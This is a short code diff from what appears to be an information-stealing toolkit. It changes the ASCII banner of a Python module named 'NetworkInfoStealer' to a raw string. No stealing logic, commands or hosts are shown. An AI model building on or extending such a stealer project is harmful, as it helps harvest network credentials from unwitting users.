@@ -8,7 +8,7 @@ class NetworkInfoRecovery(ModuleManager):
     def __init__(self) -> None:
         super().__init__(module_name = "NetworkInfoStealer")
         
-        self.banner("""
+        self.banner(r"""
      _______         _______                               _       
     |.-----.|       (_______)        _                    | |      
     ||x . x||        _     _ _____ _| |_ _ _ _  ___   ____| |  _   
